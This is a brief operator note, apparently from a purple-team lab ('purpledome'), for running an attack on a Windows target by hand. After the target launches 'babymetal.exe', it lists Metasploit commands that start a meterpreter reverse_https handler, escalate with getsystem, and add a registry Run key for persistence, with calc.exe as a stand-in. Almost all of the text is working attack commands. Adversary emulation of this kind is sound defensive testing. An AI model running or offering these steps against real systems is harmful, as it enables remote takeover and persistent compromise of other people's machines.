Manual operation
----------------

target: start babymetal.exe

attacker:
    
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.178.189   (YMMV)
set LPORT 6666 (YMMV)
run
100.64.0.25  on kali
100.64.0.25  on win

getsystem
reg setval -k HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -v purpledome -d c:\windows\system32\calc.exe